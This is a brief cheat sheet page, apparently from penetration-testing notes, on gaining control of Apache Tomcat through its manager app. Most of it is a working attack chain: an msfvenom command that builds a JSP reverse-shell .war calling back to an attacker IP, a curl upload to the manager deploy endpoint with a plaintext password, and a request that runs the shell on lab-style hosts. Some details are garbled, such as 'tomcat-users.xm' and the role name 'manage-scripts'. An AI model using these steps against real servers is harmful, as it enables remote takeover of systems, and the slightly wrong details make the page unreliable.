---
layout: default
title: Tomcat Server
parent: CHEATSHEETS
has_children: false
has_toc: false
---

{% include toc.html %}

## Users
Users and permissions are stored in `tomcat-users.xm`. Any users with `manager-gui` or `manage-scripts` have pretty much admin access.

## Permissions
If the user has `manage-scripts` permissions, they are pretty much admin of the manager app, just from the command line. Even if they can't see much UI wise, they can still upload and execute a `.war` file. If the virtual host is set to auto-unpack/update the `.war` file then uploading is enough. Steps:

```
// Create a .war file using Msfvenom.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f war > shell.war

// Upload
curl -u tomcat:'$3cureP4s5w0rd123!' --upload ./shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/shell-test-1234"

// Run.
curl http://10.10.10.194:8080/shell-test-1234/
```
